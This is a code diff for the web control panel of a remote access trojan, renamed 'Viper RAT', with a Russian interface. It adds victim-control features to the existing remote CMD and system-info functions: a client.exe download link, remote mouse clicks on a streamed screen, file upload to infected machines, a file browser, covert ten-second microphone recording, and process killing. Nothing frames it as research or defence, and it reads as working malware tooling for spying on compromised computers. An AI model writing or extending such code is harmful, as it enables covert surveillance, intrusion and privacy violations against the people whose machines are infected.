@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WebRAT Pro</title>
+    <title>Viper RAT</title>
     <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
     <style>
         body { font-family: Arial; background: #1e1e2e; color: white; padding: 20px; }
@@ -10,19 +10,24 @@
         th { background: #2d2d44; }
         .btn { background: #4CAF50; color: white; border: none; padding: 5px 10px; cursor: pointer; border-radius: 4px; margin: 2px; font-size: 12px;}
         .btn:hover { opacity: 0.8; }
-        .btn-cmd { background: #2196F3; }
-        .btn-info { background: #FF9800; }
         #viewer { margin-top: 20px; display: none; background: #111; padding: 15px; border-radius: 8px; }
-        img { width: 100%; max-width: 800px; border: 1px solid #555; display: block; }
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 100; }
-        .modal-content { background: #2d2d44; margin: 10% auto; padding: 20px; width: 400px; border-radius: 8px; }
+        img { width: 100%; max-width: 800px; border: 1px solid #555; display: block; cursor: crosshair; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 100; }
+        .modal-content { background: #2d2d44; margin: 10% auto; padding: 20px; border-radius: 8px; }
         .modal-content input { width: 100%; padding: 8px; margin: 10px 0; }
         .modal-content button { float: right; }
         #cmdOutput { background: #000; color: lime; padding: 10px; height: 150px; overflow-y: auto; font-family: monospace; margin-top: 10px; border: 1px solid #555;}
+        #folderContent, #processList { background: #111; padding: 15px; max-height: 400px; overflow-y: auto; border: 1px solid #444; margin-top: 10px;}
+        #folderContent li { list-style: none; padding: 5px; cursor: pointer; color: #ddd; }
+        #folderContent li:hover { background: #333; color: #fff; }
+        .modal .close-btn { background: #f44336; float: right; padding: 5px 10px;}
     </style>
 </head>
 <body>
-    <h1>WebRAT Pro - Управление</h1>
+    <h1>🐍 Viper RAT - Управление</h1>
+    <a href="/download/client.exe" download>
+        <button class="btn" style="background: #3498db; margin-bottom: 15px;">📥 Скачать клиент (client.exe)</button>
+    </a>
     <p>Подключенные агенты:</p>
     <table>
         <thead><tr><th>IP Агента</th><th>Действия</th></tr></thead>
@@ -31,23 +36,42 @@
 
     <div id="viewer">
         <h2>Экран: <span id="viewingUser"></span></h2>
+        <p style="font-size:12px; color: #aaa;">Кликните по экрану, чтобы двигать курсор.</p>
         <img id="screenImg" src="" />
     </div>
 
     <div id="cmdModal" class="modal">
-        <div class="modal-content">
+        <div class="modal-content" style="width: 600px;">
             <h3>Командная строка (CMD) <span id="cmdTargetIp" style="font-size:14px; color: #aaa;"></span></h3>
-            <input type="text" id="cmdInput" placeholder="Введите команду (например: ipconfig, dir)" />
+            <input type="text" id="cmdInput" placeholder="Введите команду..." />
             <button class="btn btn-cmd" onclick="sendCommand()">Выполнить</button>
-            <button class="btn" style="background: #f44336; float: right;" onclick="closeCmd()">Закрыть</button>
+            <button class="btn close-btn" onclick="closeCmd()">Закрыть</button>
             <div id="cmdOutput">Ожидание команды...</div>
+        </div>
+    </div>
+
+    <div id="folderModal" class="modal">
+        <div class="modal-content" style="width: 700px;">
+            <h3>📁 Файловый менеджер <span id="folderTargetIp" style="font-size:14px; color: #aaa;"></span></h3>
+            <button class="btn close-btn" onclick="closeFolder()">Закрыть</button>
+            <div id="folderContent">Нажмите "Папки", чтобы загрузить список...</div>
+        </div>
+    </div>
+
+    <div id="processModal" class="modal">
+        <div class="modal-content" style="width: 800px;">
+            <h3>🔄 Список процессов <span id="processTargetIp" style="font-size:14px; color: #aaa;"></span></h3>
+            <button class="btn close-btn" onclick="closeProcess()">Закрыть</button>
+            <div style="margin-top:10px;">
+                <button class="btn" onclick="refreshProcesses()">Обновить</button>
+            </div>
+            <div id="processList">Загрузка списка процессов...</div>
         </div>
     </div>
 
     <script>
         const socket = io();
-        let currentTarget = null;
-        let currentCmdTarget = null;
+        let currentTarget = null, currentCmdTarget = null, currentFolderTarget = null, currentProcessTarget = null;
 
         socket.on('update_user_list', (agents) => {
             const list = document.getElementById('agentList');
@@ -59,6 +83,10 @@
                         <button class="btn" onclick="viewScreen('${ip}')">Экран</button>
                         <button class="btn btn-cmd" onclick="openCmd('${ip}')">CMD</button>
                         <button class="btn btn-info" onclick="getSysInfo('${ip}')">Инфо</button>
+                        <button class="btn" style="background:#e67e22;" onclick="openFileUpload('${ip}')">📤 Файл</button>
+                        <button class="btn" style="background:#8e44ad;" onclick="openFolderMenu('${ip}')">📁 Папки</button>
+                        <button class="btn" style="background:#e74c3c;" onclick="captureAudio('${ip}')">🎤 Микрофон</button>
+                        <button class="btn" style="background:#9b59b6;" onclick="openProcessList('${ip}')">🔄 Процессы</button>
                     </td>
                 </tr>`;
                 list.innerHTML += row;
@@ -82,6 +110,15 @@
             }
         });
 
+        document.getElementById('screenImg').addEventListener('click', function(e) {
+            if (!currentTarget) return;
+            const rect = this.getBoundingClientRect();
+            const x = (e.clientX - rect.left) / rect.width * 640;
+            const y = (e.clientY - rect.top) / rect.height * 360;
+            socket.emit('mouse_move', { ip: currentTarget, x: x, y: y });
+            socket.emit('mouse_click', { ip: currentTarget, button: 'left' });
+        });
+
         function openCmd(ip) {
             currentCmdTarget = ip;
             document.getElementById('cmdModal').style.display = 'block';
@@ -89,10 +126,7 @@
             document.getElementById('cmdOutput').innerText = "Готов к выполнению...";
             document.getElementById('cmdInput').value = "";
         }
-
-        function closeCmd() {
-            document.getElementById('cmdModal').style.display = 'none';
-        }
+        function closeCmd() { document.getElementById('cmdModal').style.display = 'none'; }
 
         function sendCommand() {
             const cmd = document.getElementById('cmdInput').value;
@@ -107,19 +141,133 @@
             }
         });
 
-        function getSysInfo(ip) {
-            socket.emit('get_sysinfo', { ip: ip });
+        function getSysInfo(ip) { socket.emit('get_sysinfo', { ip: ip }); }
+        socket.on('display_sysinfo', (data) => {
+            alert(`Системная информация для ${data.ip}:\n\n${data.info}`);
+        });
+
+        function openFileUpload(ip) {
+            const input = document.createElement('input');
+            input.type = 'file';
+            input.onchange = (e) => {
+                const file = e.target.files[0];
+                if (!file) return;
+                const reader = new FileReader();
+                reader.onload = (e2) => {
+                    const b64data = e2.target.result.split(',')[1];
+                    socket.emit('upload_file', { ip: ip, filename: file.name, data: b64data });
+                    alert(`Файл "${file.name}" отправлен!`);
+                };
+                reader.readAsDataURL(file);
+            };
+            input.click();
         }
 
-        socket.on('display_sysinfo', (data) => {
-            if (data.ip === currentTarget) {
-                alert(`Системная информация для ${data.ip}:\n\n${data.info}`);
-            } else {
-                alert(`Инфо для ${data.ip}:\n\n${data.info}`);
+        function captureAudio(ip) {
+            socket.emit('start_audio_capture', { ip: ip, duration: 10 });
+            alert("Запись микрофона запущена на 10 секунд. Ожидайте аудиофайл.");
+        }
+        socket.on('play_audio', (data) => {
+            const blob = base64ToBlob(data.data, 'audio/wav');
+            const url = window.URL.createObjectURL(blob);
+            try {
+                const audio = new Audio(url);
+                audio.play();
+            } catch(e) {
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'microphone.wav';
+                a.click();
             }
         });
 
-        socket.on('error_msg', (msg) => alert(msg));
+        function openFolderMenu(ip) {
+            currentFolderTarget = ip;
+            document.getElementById('folderModal').style.display = 'block';
+            document.getElementById('folderTargetIp').innerText = `(${ip})`;
+            document.getElementById('folderContent').innerHTML = "Загрузка списка файлов...";
+            socket.emit('open_folder', { ip: ip, path: 'C:\\' });
+        }
+
+        function closeFolder() { document.getElementById('folderModal').style.display = 'none'; }
+        function navigateFolder(path) {
+            socket.emit('open_folder', { ip: currentFolderTarget, path: path });
+        }
+
+        socket.on('display_folder_list', (data) => {
+            if (data.ip !== currentFolderTarget) return;
+            const div = document.getElementById('folderContent');
+            if (data.error) { div.innerHTML = `<p style="color:red;">Ошибка: ${data.error}</p>`; return; }
+            let html = `<h4>📁 ${data.path}</h4><ul>`;
+            if (data.path !== 'C:\\' && data.path !== 'C:') {
+                const parentPath = data.path.substring(0, data.path.lastIndexOf('\\'));
+                html += `<li onclick="navigateFolder('${parentPath}')">📂 .. (Назад)</li>`;
+            }
+            data.folders.forEach(f => { html += `<li onclick="navigateFolder('${f.path}')">📁 ${f.name}</li>`; });
+            data.files.forEach(f => { html += `<li>📄 ${f.name}</li>`; });
+            html += '</ul>';
+            div.innerHTML = html;
+        });
+
+        function openProcessList(ip) {
+            currentProcessTarget = ip;
+            document.getElementById('processModal').style.display = 'block';
+            document.getElementById('processTargetIp').innerText = `(${ip})`;
+            document.getElementById('processList').innerHTML = "Загрузка...";
+            socket.emit('list_processes', { ip: ip });
+        }
+
+        function closeProcess() { document.getElementById('processModal').style.display = 'none'; }
+
+        function refreshProcesses() {
+            if (currentProcessTarget) {
+                document.getElementById('processList').innerHTML = "Обновление...";
+                socket.emit('list_processes', { ip: currentProcessTarget });
+            }
+        }
+
+        socket.on('display_processes', (data) => {
+            if (data.ip !== currentProcessTarget) return;
+            const div = document.getElementById('processList');
+            if (data.error) { div.innerHTML = `<p style="color:red;">Ошибка: ${data.error}</p>`; return; }
+            let html = `<table style="width:100%; color:white; border-collapse:collapse;">
+                <tr><th>PID</th><th>Имя</th><th>CPU %</th><th>Память (МБ)</th><th>Действие</th></tr>`;
+            data.processes.forEach(p => {
+                html += `<tr>
+                    <td>${p.pid}</td>
+                    <td>${p.name}</td>
+                    <td>${p.cpu !== undefined ? p.cpu.toFixed(1) : 'N/A'}</td>
+                    <td>${p.memory !== undefined ? p.memory : 'N/A'}</td>
+                    <td><button class="btn" style="background:#e74c3c; padding:2px 8px;" onclick="killProcess(${p.pid})">Завершить</button></td>
+                </tr>`;
+            });
+            html += `</table>`;
+            div.innerHTML = html;
+        });
+
+        function killProcess(pid) {
+            if (!confirm(`Завершить процесс с PID ${pid}?`)) return;
+            socket.emit('kill_process', { ip: currentProcessTarget, pid: pid });
+        }
+
+        socket.on('display_kill_result', (data) => {
+            if (data.ip !== currentProcessTarget) return;
+            if (data.success) {
+                alert(`Процесс с PID ${data.pid} успешно завершён.`);
+                refreshProcesses();
+            } else {
+                alert(`Ошибка завершения процесса ${data.pid}: ${data.error}`);
+            }
+        });
+
+        function base64ToBlob(base64, mime) {
+            const byteCharacters = atob(base64);
+            const byteNumbers = new Array(byteCharacters.length);
+            for (let i = 0; i < byteCharacters.length; i++) {
+                byteNumbers[i] = byteCharacters.charCodeAt(i);
+            }
+            return new Blob([new Uint8Array(byteNumbers)], { type: mime });
+        }
     </script>
 </body>
 </html>
